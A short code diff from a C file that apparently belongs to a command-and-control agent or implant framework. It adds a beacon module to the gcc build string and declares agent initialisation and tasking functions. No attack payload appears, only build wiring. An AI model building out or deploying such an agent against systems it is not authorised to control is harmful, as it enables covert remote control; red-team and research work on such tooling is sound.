@@ -19,7 +19,7 @@
 #include <string.h>
 #include <dirent.h>
 
-#define COMPILE "gcc -lssh -lcurl -o out/client.out out/client.c out/agent.c out/b64.c"
+#define COMPILE "gcc -lssh -lcurl -o out/client.out out/client.c out/agent.c out/b64.c out/beacon.c"
 
 void agent_init(char *agent_id);
 char *agent_get_tasking(char *agent_id);
